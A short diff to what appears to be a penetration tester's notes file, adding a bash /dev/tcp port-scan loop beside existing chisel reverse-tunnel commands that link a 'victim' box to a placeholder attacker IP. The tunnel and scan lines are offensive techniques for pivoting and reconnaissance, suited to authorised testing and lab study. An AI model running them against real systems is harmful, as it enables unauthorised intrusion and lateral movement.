@@ -38,3 +38,9 @@ https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 Victims Box: ./chisel client <attackersIP>:8011 R:1234:127.0.0.1:1234
 Attackers Box: ./chisel server -p 8011 --reverse
 ```
+
+### port checking
+
+```
+for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/<IP>/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+```
